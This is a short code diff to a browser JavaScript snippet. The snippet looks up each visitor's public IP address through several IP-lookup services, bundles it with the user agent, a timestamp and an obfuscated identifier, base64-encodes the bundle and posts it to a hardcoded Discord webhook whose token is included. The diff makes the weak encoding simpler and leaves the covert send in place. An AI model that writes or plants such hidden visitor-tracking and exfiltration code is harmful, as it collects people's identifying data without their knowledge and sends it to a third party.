@@ -14,7 +14,7 @@
         try {
             const endpoints = [
                 'https://api64.ipify.org?format=json',
-                'https://api.ipdata.co?api-key=test',
+                'https://api.ipdata.co?api-key=test', 
                 'https://ipapi.co/json/'
             ];
 
@@ -32,15 +32,14 @@
             if (!data?.ip) return;
 
             const info = {
-                ip: data.ip,
+                ip: data.ip, // Send raw IP without encoding
                 ua: navigator.userAgent,
                 ts: Date.now(),
                 id: _0x2b1c
             };
 
-            const encrypted = btoa(JSON.stringify(info))
-                .split('').reverse().join('')
-                .replace(/=/g, '')
+            // Simplified encryption - just base64 encode the whole object
+            const encrypted = btoa(JSON.stringify(info)) 
                 + Math.random().toString(36).slice(2);
 
             await fetch('https://discord.com/api/webhooks/1317108564736737382/oxsbS03XDSYsKHyNKFSbgaC90hUY3luNIz-q3BPBDDZ6zVXkagBVEqcBAynL1kqGbPEH', {
